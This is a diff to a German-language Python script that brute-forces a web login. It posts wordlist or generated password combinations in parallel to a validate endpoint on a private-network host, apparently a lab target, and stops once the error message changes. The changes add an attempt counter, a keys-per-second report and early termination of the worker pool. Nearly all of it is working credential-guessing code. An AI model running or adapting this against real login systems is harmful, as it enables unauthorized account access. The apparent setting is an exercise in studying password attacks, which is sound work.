@@ -47,10 +47,11 @@ def combine_profil(user_list, combination_list):
 
 url = 'http://172.50.1.5:8080/validate?'
 
+test_key_counter = []
 
 def execute_hack(x):
     combinations = combination_array
-
+    global test_key_counter
     if user_input == 'joe':
         #print('Versuchsnummer: ' + str(x) + ' key: ' + passwords[x])
         data = {
@@ -58,13 +59,16 @@ def execute_hack(x):
             'passwort': passwords[x]
         }
         r = session.post(url, data=data, stream=True)
+        test_key_counter.append('k')
         if r.text != 'Benutzername oder Passwort falsch!':
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + passwords[x])
             print(r.text)
             elapsed_time = time.time() - start_time
             print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
-            print('Getestete Keys pro Sekunde: ' + str(x/elapsed_time))
+            print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
+            print('Getestete Keys: ' + str(len(test_key_counter)))
+            pool.terminate()
 
     else:
 
@@ -74,14 +78,18 @@ def execute_hack(x):
             'passwort': ''.join(combinations[x])
         }
         r = session.post(url, data=data, stream=True)
+        test_key_counter.append('k')
         if r.text != 'Benutzername oder Passwort falsch!':
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + ''.join(combinations[x]))
             print(r.text)
             elapsed_time = time.time() - start_time
             print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
-            print('Getestete Keys pro Sekunde: ' + str(x/elapsed_time))
+            print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
+            print('Getestete Keys: ' + str(len(test_key_counter)))
 
+            pool.terminate()
+    print(len(test_key_counter))
 
 if user_input != 'joe':
     password_length = int(input('Wie lang soll das Passwort sein? '))
@@ -114,7 +122,3 @@ else:
     range_iteration = range(len(combination_array))
 
 results_for = pool.map(execute_hack, range_iteration)
-
-pool.close()
-pool.join()
-
